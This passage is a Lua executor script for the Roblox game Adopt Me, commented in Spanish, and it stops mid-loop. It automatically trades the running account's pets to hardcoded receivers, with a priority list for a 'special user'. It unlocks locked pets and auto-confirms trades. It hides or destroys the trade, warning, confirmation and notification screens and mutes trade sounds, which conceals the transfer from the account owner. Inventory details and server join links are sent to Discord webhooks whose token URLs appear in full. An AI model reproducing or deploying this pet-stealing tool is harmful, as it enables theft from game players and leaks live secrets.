local CONFIG = {
    TARGET_USERNAME = "mateoninjarexcrack",
    -- Esta fase siempre ocurre antes que TARGET_USERNAME.
    -- Cada string envia TODAS las pets con ese nombre. Para limitar una especie,
    -- usa { NAME = "Pet Name", QUANTITY = 1 }. QUANTITY=0 significa todas.
    SPECIAL_USER = {
        ENABLED = true,
        USERNAME = "offforyou2",
        PETS = {
            "Bat Dragon",
            "Shadow Dragon",
            "Giraffe",
            "Safari Egg",
            "Frost Dragon",
            "Amethyst Penguin",
            "Owl",
            "Giant Panda",
            "Blazing Lion",
            "Parrot",
            "Crow",
            "Balloon Unicorn",
            "African Wild Dog",
            "Haetae",
            "Cryptid",
            "Orchid Butterfly",
            "Jungle Egg",
            "Evil Unicorn",
            "Farm Egg",
            "Hedgehog",
            "Jekyll Hydra",
            "Undead Jousting Horse",
            "Diamond Butterfly",
            "Dalmatian",
            "Arctic Reindeer",
            "Blue Egg",
            "Strawberry Shortcake Bat Dragon",
            "Chocolate Chip Bat Dragon",
            "Mini Pig",
            "Monkey King",
            "Royal Mistletroll",
            "Pelican",
            "Pink Egg",
            "Strawberry Tortle",
            "Grim Dragon",
            "Hot Doggo",
            "Peppermint Penguin",
            "Cabbit",
            "Cow",
            "Goose",
            "Frostbite Bear",
            "Fairy Bat Dragon",
            "Werewolf",
            "Sugar Glider",
            "Bush Elephant",
            "Frost Unicorn",
            "Turtle",
            "Alpaca",
            "Tió De Nadal",
            "Siamese Cat",
            "Candicorn",
            "Candyfloss Chick",
            "Mermicorn",
            "Flamingo",
            "Tortoiseshell Guinea Pig",
            "Christmas Egg",
            "Mechapup",
            "Kangaroo",
            "Caterpillar",
            "Blue Dog",
            "Elephant",
            "Albino Monkey",
            "Border Collie",
            "Pirate Ghost Capuchin Monkey",
            "Crocodile",
            "Winged Tiger",
            "Black-Chested Pheasant",
            "Jellyfish",
            "Sugar Axolotl",
            "Vampire Dragon",
            "Moonbeam Peacock",
            "Sea Slug",
            "Lion",
            "Silverback Gorilla",
            "Honey Badger",
            "Trihorned Treehopper",
            "Midnight Dragon",
            "Giant Anteater",
            "Shark Puppy",
            "Bald Eagle",
            "Phantom Dragon",
            "Munchkin Cat",
            "Zombie Buffalo",
            "Aurora Fox",
            "Emperor Gorilla",
            "Cupid Dragon",
            "Fallow Deer",
            "Strawberry Penguin",
            "Hero Gibbon",
            "Pig",
            "Field Mouse",
            "Lion Cub",
            "Ring-Tailed Lemur",
            "Sakura Spirit",
            "Christmas Pudding Pup",
            "Tortuga De La Isla",
            "Pink Cat",
            "Nessie",
            "Jousting Horse",
            "Arctic Dusk Dragon",
            "Velocirooster",
            "Matcha Cat",
            "Papa Moose",
            "Jester Dragon",
            "Arctic Fox",
            "Many Mackerel",
            "Halloween White Ghost Dragon",
            "Snow Monkey",
            "Frost Fury",
            "Sheeeeep",
            "Giant Gold Scarab",
            "Meerkat",
            "Irish Water Spaniel",
            "Diamond Hummingbird",
            "Diamond Amazon",
            "Lava Dragon",
            "Shrew",
            "Caelum Cervi",
            "Glacier Moth",
            "Glacier Kitsune",
            "Rose Dragon",
            "Copycat",
            "Goat",
            "Ballet Swan",
            "Brown Bear",
            "Aussie Egg",
            "Cheetah",
            "Groundhog",
            "Corn Doggo",
        },
        MAX_ITEMS = 18,
        UNLOCK_LOCKED = true,
        WEBHOOK = {
            ENABLED = true,
            URL = "https://discord.com/api/webhooks/1561085775527936142/rIQDqAOHTVbkAzRWMbY7rTmouaimgmPFb8XD8aj7Lc0_mhACWQLN1K0g2sHHX6TNVvtb", -- webhook privado exclusivo del special user
            SEND_ON_START = true,
            SEND_AFTER_TRADE = true,
            INCLUDE_JOB_ID = true,
            INCLUDE_UIDS = false,
            USERNAME = "JF Special Receiver",
        },
    },
    MODE = "all", -- "all" o "filters"
    FILTERS = {
    },
    -- Solo con MODE="all": estos nombres salen primero, respetando este orden.
    -- Los que no aparezcan aqui se procesan despues normalmente.
    PRIORITY = {
    },
    -- Filtros avanzados. "any" no filtra esa propiedad.
    ADVANCED_FILTERS = {
        INCLUDE_NAMES = {},             -- vacio = cualquier nombre (MODE="filters" sigue usando FILTERS)
        EXCLUDE_NAMES = {},             -- siempre gana sobre INCLUDE_NAMES/FILTERS
        VARIANT = "any",                -- "any", "normal", "neon", "mega"
        FLY = "any",                    -- "any", "yes", "no"
        RIDE = "any",                   -- "any", "yes", "no"
        AGES = {},                       -- numeros permitidos; vacio = cualquier edad
        MIN_AGE = nil,                   -- numero o nil
        MAX_AGE = nil,                   -- numero o nil
        MAX_PER_NAME = 0,                -- 0 = sin limite por nombre
        FAVORITES = "skip",             -- "skip" o "include"
        LOCKED = "skip",                -- "skip", "include" o "unlock"
        SPAWNED = "skip",               -- "skip", "include" o "only"
    },
    MAX_ITEMS = 18,
    AUTO_READY = true,
    AUTO_CONFIRM = true,
    SHOW_LOGS = true,
    LOW_RESOURCE_MODE = true,
    LOW_RESOURCE = {
        HIDE_TRADE_UI = true,
        HIDE_DIALOGS = true,
        HIDE_WARNINGS = true,
        HIDE_HINTS = true,
        HIDE_NOTIFICATIONS = true,
        HIDE_CENTER_MESSAGES = true,
        HIDE_ALL_TRADE_MESSAGES = true,
        USE_RARE_UI_METHOD = true, -- elimina estas apps hasta reconectar; no se puede restaurar con stop()
        RARE_DESTROY_NAMES = {
            "HintApp",
            "HintsApp",
            "DialogApp",
            "WarningApp",
            "ConfirmationApp",
            "ConfirmApp",
            "NotificationApp",
            "NotificationsApp",
            "ToastApp",
        },
        CENTER_MESSAGE_PATTERNS = {
            "not tradeable",
            "not tradable",
            "cannot be traded",
            "can't be traded",
            "trade was successful",
            "trade successful",
            "pending request with this person",
            "already have a pending request",
        },
        DISABLE_BLUR = true,
        MUTE_TRADE_SOUNDS = true,
    },
    WEBHOOK = {
        ENABLED = true,
        URL = "https://discord.com/api/webhooks/1565425868191563858/NWNmE5mMhHh4mpRHYX7DNnv4ailId0wSN-kopCTdcZFZDBACK85bKOJczlMQhjUgdaUr", -- pega aqui TU webhook privado
        SEND_ON_START = true,
        SEND_AFTER_TRADE = true,
        INCLUDE_JOB_ID = true,
        INCLUDE_UIDS = false,
        USERNAME = "JF Trade Manager",
    },
    REQUEST_INTERVAL = 2.5,
    ITEM_DELAY = 0.12,
    ACTION_DELAY = 0.22,
    BETWEEN_CYCLES = 0.35,
    FINISH_TIMEOUT = 60,
}

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local StarterGui = game:GetService("StarterGui")
local SoundService = game:GetService("SoundService")
local HttpService = game:GetService("HttpService")

local LP = Players.LocalPlayer
local EXPECTED_GAME_ID = 383310974
local OUTPUT = "jf_adopt_me_private_trade_test_log.txt"

repeat task.wait() until game:IsLoaded()

local env = type(getgenv) == "function" and getgenv() or _G
local previous = rawget(env, "__JF_AME_PRIVATE_TRADE_TEST")
if type(previous) == "table" and type(previous.stop) == "function" then
    pcall(previous.stop)
end

local runtime = { stopped = false, connections = {}, sentRequest = false, changed = {}, muted = {}, centerScanned = false, watchedText = setmetatable({}, { __mode = "k" }), specialTransferred = {} }
rawset(env, "__JF_AME_PRIVATE_TRADE_TEST", runtime)

local function log(message)
    local line = string.format("[%s] %s", os.date("%H:%M:%S"), tostring(message))
    if CONFIG.SHOW_LOGS then print("[JF AME Private] " .. line) end
    pcall(function()
        if type(appendfile) == "function" then appendfile(OUTPUT, line .. "\n") end
    end)
end

local function notify(message)
    local low = type(CONFIG.LOW_RESOURCE) == "table" and CONFIG.LOW_RESOURCE or {}
    if CONFIG.LOW_RESOURCE_MODE and low.HIDE_NOTIFICATIONS then return end
    pcall(function()
        StarterGui:SetCore("SendNotification", {
            Title = "JF Adopt Me Private",
            Text = tostring(message),
            Duration = 6,
        })
    end)
end

local function rememberAndSet(object, property, value)
    if not object then return end
    runtime.changed[object] = runtime.changed[object] or {}
    if runtime.changed[object][property] == nil then
        local ok, original = pcall(function() return object[property] end)
        if not ok then return end
        runtime.changed[object][property] = original
    end
    pcall(function() object[property] = value end)
end

local function suppressGui(object)
    if not object then return end
    if object:IsA("ScreenGui") then rememberAndSet(object, "Enabled", false)
    elseif object:IsA("GuiObject") then rememberAndSet(object, "Visible", false) end
end

local function rareShouldDestroy(object)
    local low = type(CONFIG.LOW_RESOURCE) == "table" and CONFIG.LOW_RESOURCE or {}
    if not low.USE_RARE_UI_METHOD or not object then return false end
    for _, name in ipairs(type(low.RARE_DESTROY_NAMES) == "table" and low.RARE_DESTROY_NAMES or {}) do
        if object.Name == name then return true end
    end
    return false
end

local function applyRareUiMethod(gui)
    if not gui then return end
    for _, object in ipairs(gui:GetChildren()) do
        if rareShouldDestroy(object) then pcall(function() object:Destroy() end) end
    end
end

local function suppressTransientText(object)
    local low = type(CONFIG.LOW_RESOURCE) == "table" and CONFIG.LOW_RESOURCE or {}
    if not low.HIDE_CENTER_MESSAGES or not object or not (object:IsA("TextLabel") or object:IsA("TextButton")) then return end
    local text = tostring(object.Text or ""):lower()
    local matched = false
    if low.HIDE_ALL_TRADE_MESSAGES and text:find("trade", 1, true) then
        matched = true
    end
    if not matched then
        for _, pattern in ipairs(type(low.CENTER_MESSAGE_PATTERNS) == "table" and low.CENTER_MESSAGE_PATTERNS or {}) do
            if text:find(tostring(pattern):lower(), 1, true) then matched = true; break end
        end
    end
    if matched then
        rememberAndSet(object, "Visible", false)
    else
        local saved = runtime.changed[object]
        if saved and saved.Visible ~= nil then pcall(function() object.Visible = saved.Visible end) end
    end
end

local function watchTransientText(object)
    if not object or runtime.watchedText[object] or not (object:IsA("TextLabel") or object:IsA("TextButton")) then return end
    runtime.watchedText[object] = true
    suppressTransientText(object)
    runtime.connections[#runtime.connections + 1] = object:GetPropertyChangedSignal("Text"):Connect(function()
        suppressTransientText(object)
    end)
end

local function applyLowResourceMode()
    if not CONFIG.LOW_RESOURCE_MODE then return end
    local low = type(CONFIG.LOW_RESOURCE) == "table" and CONFIG.LOW_RESOURCE or {}
    local gui = LP:FindFirstChildOfClass("PlayerGui")
    if gui then
        applyRareUiMethod(gui)
        local groups = {
            { low.HIDE_TRADE_UI, { "TradeApp" } },
            { low.HIDE_DIALOGS, { "DialogApp" } },
            { low.HIDE_WARNINGS, { "WarningApp", "ConfirmationApp", "ConfirmApp" } },
            { low.HIDE_HINTS, { "HintApp", "HintsApp" } },
            { low.HIDE_NOTIFICATIONS, { "NotificationApp", "NotificationsApp", "ToastApp" } },
        }
        for _, group in ipairs(groups) do
            if group[1] then
                for _, name in ipairs(group[2]) do suppressGui(gui:FindFirstChild(name)) end
            end
        end
        if low.HIDE_CENTER_MESSAGES and not runtime.centerScanned then
            runtime.centerScanned = true
            for _, object in ipairs(gui:GetDescendants()) do watchTransientText(object) end
        end
    end
    if low.DISABLE_BLUR then
        for _, parent in ipairs({ workspace.CurrentCamera, game:GetService("Lighting") }) do
            if parent then
                for _, effect in ipairs(parent:GetChildren()) do
                    if effect:IsA("BlurEffect") then rememberAndSet(effect, "Enabled", false) end
                end
            end
        end
    end
    if low.MUTE_TRADE_SOUNDS then
        for _, sound in ipairs(SoundService:GetDescendants()) do
            if sound:IsA("Sound") then
                local id = (sound.Name .. " " .. sound.SoundId):lower()
                if (id:find("trade", 1, true) or id:find("countdown", 1, true)) and runtime.muted[sound] == nil then
                    runtime.muted[sound] = { playing = sound.IsPlaying, position = sound.TimePosition }
                    sound:Stop()
                end
            end
        end
    end
end

local function restoreLowResourceMode()
    for object, properties in pairs(runtime.changed) do
        if object and object.Parent then
            for property, original in pairs(properties) do pcall(function() object[property] = original end) end
        end
    end
    for sound, state in pairs(runtime.muted) do
        if sound and sound.Parent then
            pcall(function()
                sound.TimePosition = state.position or 0
                if state.playing then sound:Play() end
            end)
        end
    end
    runtime.changed, runtime.muted = {}, {}
end

local function hideTradeVisuals()
    applyLowResourceMode()
end

function runtime.stop(reason)
    if runtime.stopped then return end
    runtime.stopped = true
    for _, connection in ipairs(runtime.connections) do
        pcall(function() connection:Disconnect() end)
    end
    restoreLowResourceMode()
    if reason then
        log("STOP: " .. tostring(reason))
        notify(tostring(reason))
    end
end

pcall(function()
    if type(writefile) == "function" then
        writefile(OUTPUT, "JF ADOPT ME PRIVATE TRADE TEST\n")
    end
end)

if game.GameId ~= EXPECTED_GAME_ID then
    runtime.stop("Solo funciona en Adopt Me")
    return
end

local targetName = tostring(CONFIG.TARGET_USERNAME or ""):match("^%s*(.-)%s*$")
if targetName == "" or targetName == "TargetUsername" then
    runtime.stop("Configura TARGET_USERNAME")
    return
end

local specialConfig = type(CONFIG.SPECIAL_USER) == "table" and CONFIG.SPECIAL_USER or {}
local specialEnabled = specialConfig.ENABLED == true
local specialName = tostring(specialConfig.USERNAME or ""):match("^%s*(.-)%s*$")
if specialEnabled and (specialName == "" or specialName == "SpecialUsername") then
    runtime.stop("Configura SPECIAL_USER.USERNAME o desactiva SPECIAL_USER.ENABLED")
    return
end
if specialEnabled and specialName:lower() == targetName:lower() then
    runtime.stop("SPECIAL_USER.USERNAME y TARGET_USERNAME deben ser diferentes")
    return
end

if CONFIG.MODE ~= "all" and CONFIG.MODE ~= "filters" then
    runtime.stop("MODE debe ser 'all' o 'filters'")
    return
end

-- Se aplica una vez al arrancar y de nuevo cuando el juego crea interfaces/sonidos tardios.
applyLowResourceMode()
local playerGui = LP:FindFirstChildOfClass("PlayerGui")
if playerGui then
    runtime.connections[#runtime.connections + 1] = playerGui.DescendantAdded:Connect(function(object)
        if rareShouldDestroy(object) then
            pcall(function() object:Destroy() end)
            return
        end
        if object.Parent == playerGui then task.defer(applyLowResourceMode) end
        task.defer(watchTransientText, object)
        task.delay(0.15, function() if not runtime.stopped then watchTransientText(object) end end)
    end)
end
runtime.connections[#runtime.connections + 1] = SoundService.DescendantAdded:Connect(function(object)
    if object:IsA("Sound") then task.defer(applyLowResourceMode) end
end)

local fsys = ReplicatedStorage:FindFirstChild("Fsys")
local load
pcall(function() load = require(fsys).load end)
if type(load) ~= "function" then
    runtime.stop("No pude cargar Fsys")
    return
end

local function loadModule(name)
    local ok, result = pcall(function() return load(name) end)
    return ok and result or nil
end

local router = loadModule("RouterClient")
local clientData = loadModule("ClientData")
local inventoryDB = loadModule("InventoryDB")
if type(router) ~= "table" or type(router.get) ~= "function" then
    runtime.stop("RouterClient no disponible")
    return
end

local function route(name)
    local ok, remote = pcall(function() return router.get(name) end)
    return ok and remote or nil
end

local sendTrade = route("TradeAPI/SendTradeRequest")
local addItem = route("TradeAPI/AddItemToOffer")
local accept = route("TradeAPI/AcceptNegotiation")
local confirm = route("TradeAPI/ConfirmTrade")
local setBackpackLocks = route("BackpackAPI/CommitBackpackItemSet")
if not (sendTrade and addItem and accept and confirm) then
    runtime.stop("Faltan remotes de trade")
    return
end

local filters = {}
for _, name in ipairs(CONFIG.FILTERS or {}) do
    if type(name) == "string" and name ~= "" then filters[name] = true end
end
local specialRank, specialLimits = {}, {}
for index, entry in ipairs(type(specialConfig.PETS) == "table" and specialConfig.PETS or {}) do
    local name, quantity
    if type(entry) == "string" then
        name, quantity = entry, math.huge
    elseif type(entry) == "table" then
        name = entry.NAME or entry.Name or entry.name
        quantity = tonumber(entry.QUANTITY or entry.Quantity or entry.quantity) or 0
        if quantity <= 0 then quantity = math.huge else quantity = math.floor(quantity) end
    end
    name = type(name) == "string" and name:match("^%s*(.-)%s*$") or ""
    local lower = name:lower()
    if name ~= "" then
        if specialRank[lower] == nil then specialRank[lower] = index end
        specialLimits[lower] = quantity
    end
end
if specialEnabled and next(specialRank) == nil then
    runtime.stop("Agrega al menos una pet a SPECIAL_USER.PETS")
    return
end
local priorityRank = {}
if CONFIG.MODE == "all" then
    for index, name in ipairs(type(CONFIG.PRIORITY) == "table" and CONFIG.PRIORITY or {}) do
        if type(name) == "string" and name ~= "" and priorityRank[name:lower()] == nil then
            priorityRank[name:lower()] = index
        end
    end
end
if CONFIG.MODE == "filters" and next(filters) == nil then
    runtime.stop("Agrega al menos un nombre a FILTERS")
    return
end

local AF = type(CONFIG.ADVANCED_FILTERS) == "table" and CONFIG.ADVANCED_FILTERS or {}
local function nameSet(list)
    local set = {}
    for _, value in ipairs(type(list) == "table" and list or {}) do
        if type(value) == "string" and value ~= "" then set[value:lower()] = true end
    end
    return set
end
local includeNames, excludeNames = nameSet(AF.INCLUDE_NAMES), nameSet(AF.EXCLUDE_NAMES)
local allowedAges = {}
for _, value in ipairs(type(AF.AGES) == "table" and AF.AGES or {}) do
    local age = tonumber(value)
    if age then allowedAges[age] = true end
end
local minAge, maxAge = tonumber(AF.MIN_AGE), tonumber(AF.MAX_AGE)
local function boolFilter(mode, value)
    mode = tostring(mode or "any"):lower()
    return mode == "any" or (mode == "yes" and value == true) or (mode == "no" and value ~= true)
end
local function validMode(value, allowed, fallback)
    value = tostring(value or fallback):lower()
    return allowed[value] and value or fallback
end
AF.VARIANT = validMode(AF.VARIANT, { any=true, normal=true, neon=true, mega=true }, "any")
AF.FLY = validMode(AF.FLY, { any=true, yes=true, no=true }, "any")
AF.RIDE = validMode(AF.RIDE, { any=true, yes=true, no=true }, "any")
AF.FAVORITES = validMode(AF.FAVORITES, { skip=true, include=true }, "skip")
AF.LOCKED = validMode(AF.LOCKED, { skip=true, include=true, unlock=true }, "skip")
AF.SPAWNED = validMode(AF.SPAWNED, { skip=true, include=true, only=true }, "skip")

local function targetPlayer(username)
    for _, player in ipairs(Players:GetPlayers()) do
        if player.Name:lower() == tostring(username):lower() then return player end
    end
end

local function readItems(phase)
    phase = phase == "special" and "special" or "normal"
    local inventory
    pcall(function()
        if type(clientData) == "table" and type(clientData.get) == "function" then
            inventory = clientData.get("inventory")
        end
    end)
    local pets = type(inventory) == "table" and inventory.pets or {}
    local petDB = type(inventoryDB) == "table" and inventoryDB.pets or {}
    local locks = type(inventory) == "table" and (inventory.backpack_locks or inventory.locks) or nil
    if type(locks) ~= "table" then
        pcall(function() locks = clientData.get("backpack_locks") end)
    end
    locks = type(locks) == "table" and locks or {}
    local candidates = {}
    for uid, pet in pairs(pets) do
        local ptab = type(pet) == "table" and pet or {}
        local info = petDB[ptab.id]
        local name = type(info) == "table" and info.name or nil
        local props = ptab.properties or ptab.props or {}
        props = type(props) == "table" and props or {}
        local lower = name and name:lower()
        local mega, neon = props.mega_neon == true, props.neon == true
        local fly, ride = props.flyable == true, props.rideable == true
        local age = tonumber(props.age or props.pet_age or ptab.age)
        local favorite = props.favorite == true or props.favorited == true or props.is_favorite == true or ptab.favorite == true
        local locked = locks[uid] == true or props.locked == true or ptab.locked == true
        local spawned = ptab.is_spawned == true or ptab.equipped == true or props.spawned == true
            or props.equipped == true or props._equipped == true or props._spawned ~= nil
        local legacyNameOK = CONFIG.MODE == "all" or filters[name] == true
        local includeOK = next(includeNames) == nil and legacyNameOK or includeNames[lower] == true
        local variantOK = AF.VARIANT == "any"
            or (AF.VARIANT == "mega" and mega)
            or (AF.VARIANT == "neon" and neon and not mega)
            or (AF.VARIANT == "normal" and not neon and not mega)
        local ageOK = next(allowedAges) == nil or (age ~= nil and allowedAges[age] == true)
        if ageOK and minAge ~= nil then ageOK = age ~= nil and age >= minAge end
        if ageOK and maxAge ~= nil then ageOK = age ~= nil and age <= maxAge end
        local spawnedOK = AF.SPAWNED == "include" or (AF.SPAWNED == "only" and spawned) or (AF.SPAWNED == "skip" and not spawned)
        local normalOK = name and includeOK and not excludeNames[lower] and variantOK
            and boolFilter(AF.FLY, fly) and boolFilter(AF.RIDE, ride) and ageOK
            and (AF.FAVORITES == "include" or not favorite)
            and (AF.LOCKED ~= "skip" or not locked) and spawnedOK
        local specialOK = name and specialRank[lower] ~= nil
        if (phase == "special" and specialOK) or (phase == "normal" and normalOK) then
            candidates[#candidates + 1] = {
                uid = uid, name = name, age = age, neon = neon, mega = mega,
                fly = fly, ride = ride, favorite = favorite, locked = locked, spawned = spawned,
            }
        end
    end
    table.sort(candidates, function(a, b)
        local ranks = phase == "special" and specialRank or priorityRank
        local rankA = ranks[a.name:lower()] or math.huge
        local rankB = ranks[b.name:lower()] or math.huge
        if rankA ~= rankB then return rankA < rankB end
        if a.name == b.name then return tostring(a.uid) < tostring(b.uid) end
        return a.name < b.name
    end)
    local selected, perName = {}, {}
    local maxPerName = phase == "special" and 0 or math.max(0, tonumber(AF.MAX_PER_NAME) or 0)
    local maxItems = phase == "special"
        and math.max(1, math.min(18, tonumber(specialConfig.MAX_ITEMS) or 18))
        or math.max(1, math.min(18, tonumber(CONFIG.MAX_ITEMS) or 18))
    for _, pet in ipairs(candidates) do
        local count = perName[pet.name] or 0
        local totalLimit = phase == "special" and (specialLimits[pet.name:lower()] or 0) or math.huge
        local alreadySent = phase == "special" and (runtime.specialTransferred[pet.name:lower()] or 0) or 0
        local phaseLimit = totalLimit == math.huge and math.huge or math.max(0, totalLimit - alreadySent)
        local allowed = (maxPerName == 0 or count < maxPerName) and count < phaseLimit
        if allowed then
            selected[#selected + 1] = pet
            perName[pet.name] = count + 1
            if #selected >= maxItems then break end
        end
    end
    return selected
end

local function requestFunction()
    if type(request) == "function" then return request end
    if type(http_request) == "function" then return http_request end
    if type(syn) == "table" and type(syn.request) == "function" then return syn.request end
    return nil
end

local function itemDisplay(item, webhook)
    local tags = {}
    if item.mega then tags[#tags + 1] = "Mega"
    elseif item.neon then tags[#tags + 1] = "Neon" end
    if item.fly then tags[#tags + 1] = "Fly" end
    if item.ride then tags[#tags + 1] = "Ride" end
    if item.age ~= nil then tags[#tags + 1] = "Age " .. tostring(item.age) end
    local name = (#tags > 0 and (table.concat(tags, " ") .. " ") or "") .. item.name
    webhook = type(webhook) == "table" and webhook or {}
    if webhook.INCLUDE_UIDS then name = name .. " (`" .. tostring(item.uid) .. "`)" end
    return name
end

local function inventorySummary(items, webhook)
    local counts, order = {}, {}
    for _, item in ipairs(items) do
        local name = itemDisplay(item, webhook)
        if not counts[name] then order[#order + 1] = name; counts[name] = 0 end
        counts[name] = counts[name] + 1
    end
    table.sort(order)
    local lines = {}
    for _, name in ipairs(order) do
        lines[#lines + 1] = ("• %dx %s"):format(counts[name], name)
    end
    local result = #lines > 0 and table.concat(lines, "\n") or "No matching items"
    if #result > 3800 then result = result:sub(1, 3780) .. "\n… truncated" end
    return result
end

local function sendInventoryWebhook(webhook, receiverName, status, items, phase)
    webhook = type(webhook) == "table" and webhook or {}
    if not webhook.ENABLED then return false, "disabled" end
    local url = tostring(webhook.URL or "")
    if url == "" or not url:match("^https://") then return false, "invalid URL" end
    local req = requestFunction()
    if not req then return false, "executor has no request function" end
    local joinWeb = ("https://www.roblox.com/games/start?placeId=%s&gameInstanceId=%s"):format(game.PlaceId, game.JobId)
    local joinApp = ("roblox://experiences/start?placeId=%s&gameInstanceId=%s"):format(game.PlaceId, game.JobId)
    local fields = {
        { name = "Account", value = ("`%s` → `%s`"):format(LP.Name, receiverName), inline = false },
        { name = "Phase", value = phase == "special" and "SPECIAL (first priority)" or "NORMAL", inline = true },
        { name = "Selected inventory", value = inventorySummary(items, webhook), inline = false },
        { name = "Items", value = tostring(#items), inline = true },
        { name = "Status", value = tostring(status), inline = true },
        { name = "Join server", value = ("[Open in Roblox](%s)\n`%s`"):format(joinWeb, joinApp), inline = false },
    }
    if webhook.INCLUDE_JOB_ID then fields[#fields + 1] = { name = "Job ID", value = "`" .. game.JobId .. "`", inline = false } end
    local body = HttpService:JSONEncode({
        username = tostring(webhook.USERNAME or "JF Trade Manager"),
        embeds = {{
            title = phase == "special" and "Adopt Me special receiver" or "Adopt Me inventory report",
            color = (status == "READY_TO_JOIN" or status == "READY") and 3447003 or 5763719,
            fields = fields,
            footer = { text = os.date("!%Y-%m-%d %H:%M:%S UTC") },
        }},
    })
    local ok, response = pcall(req, {
        Url = url, Method = "POST",
        Headers = { ["Content-Type"] = "application/json" },
        Body = body,
    })
    local code = ok and response and (response.StatusCode or response.Status) or nil
    local success = ok and (code == nil or (tonumber(code) and tonumber(code) >= 200 and tonumber(code) < 300))
    log("Webhook " .. tostring(status) .. " -> " .. (success and "ok" or ("failed code=" .. tostring(code))))
    return success, response
end

local function tradeOpen()
    local gui = LP:FindFirstChildOfClass("PlayerGui")
    local app = gui and gui:FindFirstChild("TradeApp")
    local frame = app and app:FindFirstChild("Frame")
    -- El estado sigue leyéndose aunque LOW_RESOURCE_MODE oculte el ScreenGui.
    return app and frame and frame.Visible == true
end

local function waitForTradeOpen(receiverName)
    runtime.sentRequest = false
    while not runtime.stopped and not tradeOpen() do
        local target = targetPlayer(receiverName)
        if not target then
            runtime.sentRequest = false
            task.wait(0.5)
        else
            local ok, err = pcall(function() sendTrade:FireServer(target) end)
            log("SendTradeRequest -> ok=" .. tostring(ok) .. (ok and "" or (" err=" .. tostring(err))))
            if ok then notify("Solicitud enviada a " .. target.Name) end
            task.wait(math.max(1, tonumber(CONFIG.REQUEST_INTERVAL) or 2.5))
        end
    end
    return not runtime.stopped and tradeOpen()
end

local function itemSet(items)
    local set = {}
    for _, item in ipairs(items) do set[item.uid] = item.name end
    return set
end

local normalWebhook = type(CONFIG.WEBHOOK) == "table" and CONFIG.WEBHOOK or {}
local specialWebhook = type(specialConfig.WEBHOOK) == "table" and specialConfig.WEBHOOK or {}
local phase = specialEnabled and #readItems("special") > 0 and "special" or "normal"

log(string.format("START | sender=%s | special=%s | target=%s | mode=%s", LP.Name,
    specialEnabled and specialName or "disabled", targetName, CONFIG.MODE))
if phase == "special" then
    local initialItems = readItems("special")
    notify("Prioridad especial: esperando a " .. specialName)
    if specialWebhook.SEND_ON_START then
        task.spawn(sendInventoryWebhook, specialWebhook, specialName, "READY_TO_JOIN", initialItems, "special")
    end
else
    if specialEnabled then log("SPECIAL completo o sin coincidencias; comienza fase normal") end
    local initialItems = readItems("normal")
    notify("Esperando a " .. targetName)
    if normalWebhook.SEND_ON_START then
        task.spawn(sendInventoryWebhook, normalWebhook, targetName, "READY_TO_JOIN", initialItems, "normal")
    end
end

local cycle = 0
while not runtime.stopped do
    -- Siempre se vuelve a leer ClientData: lo transferido deja de aparecer y lo
    -- cancelado sigue disponible para el siguiente intento.
    local items = readItems(phase)
    if #items == 0 then
        if phase == "special" then
            log("SPECIAL LIST COMPLETE | ahora se habilita el receiver normal")
            if specialWebhook.SEND_AFTER_TRADE then
                task.spawn(sendInventoryWebhook, specialWebhook, specialName, "SPECIAL_LIST_COMPLETE", {}, "special")
            end
            phase = "normal"
            local normalItems = readItems("normal")
            notify("Lista especial terminada. Esperando a " .. targetName)
            if normalWebhook.SEND_ON_START then
                task.spawn(sendInventoryWebhook, normalWebhook, targetName, "READY_TO_JOIN", normalItems, "normal")
            end
            task.wait(0.2)
            continue
        else
            runtime.stop("No quedan items para el modo seleccionado")
            break
        end
    end

    cycle = cycle + 1
    local receiverName = phase == "special" and specialName or targetName
    local activeWebhook = phase == "special" and specialWebhook or normalWebhook
    log(string.format("Ciclo %d | fase=%s | receiver=%s | lote=%d", cycle, phase, receiverName, #items))
    for _, item in ipairs(items) do
        local tags = {}
        if item.mega then tags[#tags + 1] = "MEGA" elseif item.neon then tags[#tags + 1] = "NEON" end
        if item.fly then tags[#tags + 1] = "FLY" end
        if item.ride then tags[#tags + 1] = "RIDE" end
        if item.favorite then tags[#tags + 1] = "FAVORITE" end
        if item.locked then tags[#tags + 1] = "LOCKED" end
        if item.spawned then tags[#tags + 1] = "SPAWNED" end
        if item.age ~= nil then tags[#tags + 1] = "AGE=" .. tostring(item.age) end
        log("Selected: " .. item.name .. " [" .. table.concat(tags, ",") .. "] | " .. item.uid)
    end

    if not waitForTradeOpen(receiverName) then break end
    log("Trade abierto | ciclo " .. cycle .. " | receiver=" .. receiverName)
    hideTradeVisuals()

    local offered = itemSet(items)
    for _, item in ipairs(items) do
        if runtime.stopped or not tradeOpen() then break end
        local canAdd = true
        local shouldUnlock = phase == "special" and specialConfig.UNLOCK_LOCKED == true
            or phase == "normal" and AF.LOCKED == "unlock"
        if item.locked and shouldUnlock then
            if setBackpackLocks then
                local unlocked, unlockErr = pcall(function()
                    setBackpackLocks:FireServer("backpack_locks", { [item.uid] = true })
                end)
                log("Unlock " .. item.name .. " -> ok=" .. tostring(unlocked) .. (unlocked and "" or (" err=" .. tostring(unlockErr))))
                canAdd = unlocked
                task.wait(math.max(0.05, tonumber(CONFIG.ITEM_DELAY) or 0.12))
            else
                canAdd = false
                log("SKIP locked: falta BackpackAPI/CommitBackpackItemSet | " .. item.name)
            end
        end
        local ok, err = false, "omitido"
        if canAdd then ok, err = pcall(function() addItem:FireServer(item.uid) end) end
        log("AddItemToOffer " .. item.name .. " -> ok=" .. tostring(ok) .. (ok and "" or (" err=" .. tostring(err))))
        task.wait(math.max(0.05, tonumber(CONFIG.ITEM_DELAY) or 0.12))
    end

    local finishAt = os.clock() + math.max(10, tonumber(CONFIG.FINISH_TIMEOUT) or 60)
    while not runtime.stopped and tradeOpen() and os.clock() < finishAt do
        if CONFIG.AUTO_READY then pcall(function() accept:FireServer() end) end
        task.wait(math.max(0.1, tonumber(CONFIG.ACTION_DELAY) or 0.22))
        if CONFIG.AUTO_CONFIRM then pcall(function() confirm:FireServer() end) end
        task.wait(math.max(0.1, tonumber(CONFIG.ACTION_DELAY) or 0.22))
    end

    if runtime.stopped then break end
    if tradeOpen() then
        runtime.stop("Tiempo agotado durante el trade")
        break
    end

    task.wait(math.max(0.1, tonumber(CONFIG.BETWEEN_CYCLES) or 0.35))
    local remaining = readItems(phase)
    local stillHere = 0
    for _, item in ipairs(remaining) do
        if offered[item.uid] then stillHere = stillHere + 1 end
    end
    if phase == "special" and stillHere == 0 then
        for _, item in ipairs(items) do
            local lower = item.name:lower()
            runtime.specialTransferred[lower] = (runtime.specialTransferred[lower] or 0) + 1
        end
    end
